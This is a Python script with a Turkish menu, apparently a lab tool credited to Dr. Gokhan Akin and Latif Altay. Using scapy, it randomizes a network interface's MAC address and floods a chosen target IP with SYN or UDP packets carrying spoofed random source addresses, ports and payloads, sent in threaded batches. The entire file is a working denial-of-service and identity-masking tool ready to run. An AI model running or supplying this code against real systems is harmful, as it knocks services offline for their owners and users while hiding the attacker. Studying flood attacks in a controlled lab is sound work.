import subprocess
import re
import random
import string
import socket
import threading
import time
from scapy.all import *

def get_random_mac_address():
    mac_parts = [format(random.randint(0x00, 0xff), '02x') for _ in range(6)]
    return ':'.join(mac_parts)

def change_mac_address(interface, new_mac):
    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "down"])
    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "address", new_mac])
    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "up"])

def change_mac_and_print(interface):
    new_mac_address = get_random_mac_address()
    change_mac_address(interface, new_mac_address)
    print(f"\nMAC adresi başarıyla değiştirildi. Yeni MAC adresi: {new_mac_address}")

def list_network_interfaces():
    try:
        result = subprocess.check_output(['ip', 'link'], universal_newlines=True)
        return result
    except subprocess.CalledProcessError as error:
        return ("Hata Kodu: " + str(error.returncode), "\n Hata Çıktısı: " + str(error.output), "\nİnterface'ler Listelenemedi.")

def select_network_interface():
    interfaces = list_network_interfaces()
    print("Mevcut İnterface'ler:")
    interface_list = re.findall(r'^\d+: (\S+):', interfaces, re.MULTILINE)
    for i, interface in enumerate(interface_list, 1):
        print(f"{i}. {interface}")

    while True:
        try:
            selection = int(input("İnterface seçin (1 - n): "))
            if 1 <= selection <= len(interface_list):
                return interface_list[selection - 1]
            else:
                print("Geçersiz bir seçenek girdiniz. Lütfen doğru sayı girin.")
        except ValueError:
            print("Geçersiz bir giriş. Lütfen bir sayı girin.")

def generate_random_data(packet_size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=packet_size))

def random_ip_generator():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

def random_port():
    return random.randint(1, 65535)

def packet_size():
    return random.randint(50, 1350)

def send_packets_thread(packets):
    sendp(packets, verbose=False)

def send_syn_packet(target_ip, packet_count):
    start_time = time.time()
    conf.verb = 0
    arp_request = ARP(op=1, pdst=target_ip)
    arp_response = sr1(arp_request, timeout=1, verbose=0)

    if arp_response:
        target_mac = arp_response.hwsrc

        packets = []
        for _ in range(packet_count):
            source_ip = random_ip_generator()
            source_port = random_port()
            target_port = random_port()

            tcp_packet = Ether(dst=target_mac) / IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
            data = generate_random_data(packet_size())
            tcp_packet = tcp_packet / Raw(load=data)
            packets.append(tcp_packet)

            if len(packets) >= 100:
                t = threading.Thread(target=send_packets_thread, args=(packets,))
                t.start()
                packets = []

        if packets:
            t = threading.Thread(target=send_packets_thread, args=(packets,))
            t.start()

        end_time = time.time()
        total_time = end_time - start_time
        print(f"{packet_count} adet SYN paketi {total_time} saniyede {target_ip} adresine gönderildi.")

def send_udp_packet(target_ip, packet_count):
    start_time = time.time()
    conf.verb = 0
    arp_request = ARP(op=1, pdst=target_ip)
    arp_response = sr1(arp_request, timeout=1, verbose=0)

    if arp_response:
        target_mac = arp_response.hwsrc

        packets = []
        for _ in range(packet_count):
            source_ip = random_ip_generator()
            source_port = random_port()
            target_port = random_port()

            udp_packet = Ether(dst=target_mac) / IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port)
            data = generate_random_data(packet_size())
            udp_packet = udp_packet / Raw(load=data)
            packets.append(udp_packet)

            if len(packets) >= 100:
                t = threading.Thread(target=send_packets_thread, args=(packets,))
                t.start()
                packets = []

        if packets:
            t = threading.Thread(target=send_packets_thread, args=(packets,))
            t.start()

        end_time = time.time()
        total_time = end_time - start_time
        print(f"{packet_count} adet UDP paketi {total_time} saniyede {target_ip} adresine gönderildi.")

def print_mac_lab_art():
    print("\n" + " " * 71)
    print("       .___  ___.      ___       ______  __          ___      .______   ")
    print("       |   \/   |     /   \     /      ||  |        /   \     |   _  \  ")
    print("       |  \  /  |    /  ^  \   |  ,----'|  |       /  ^  \    |  |_)  | ")
    print("       |  |\/|  |   /  /_\  \  |  |     |  |      /  /_\  \   |   _  <  ")
    print("       |  |  |  |  /  _____  \ |  `----.|  `----./  _____  \  |  |_)  | ")
    print("       |__|  |__| /__/     \__\ \______||_______/__/     \__\ |______/  ")
    print("                                           DR. Gokhan Akin & Latif Altay")
    print(" " * 71)

def main():
    while True:
        print_mac_lab_art()
        print("\n1. İnterfaceleri listele ve MAC adresini değiştir")
        print("2. SYN Paketi Gönder")
        print("3. UDP Flood Paketi Gönder")
        print("4. Çıkış")

        choice = input("Seçiminizi yapın: ")

        if choice == '1':
            interface = select_network_interface()
            change_mac_and_print(interface)
        elif choice == '2':
            target_ip = input("Hedef IP adresini girin: ")
            packet_count = int(input("Gönderilecek SYN paketi sayısını girin: "))
            send_syn_packet(target_ip, packet_count)
        elif choice == '3':
            target_ip = input("Hedef IP adresini girin: ")
            packet_count = int(input("Gönderilecek UDP paketi sayısını girin: "))
            send_udp_packet(target_ip, packet_count)
        elif choice == '4':
            print("Programdan çıkılıyor...")
            break
        else:
            print("Geçersiz seçenek. Lütfen tekrar deneyin.")

if __name__ == "__main__":
    main()
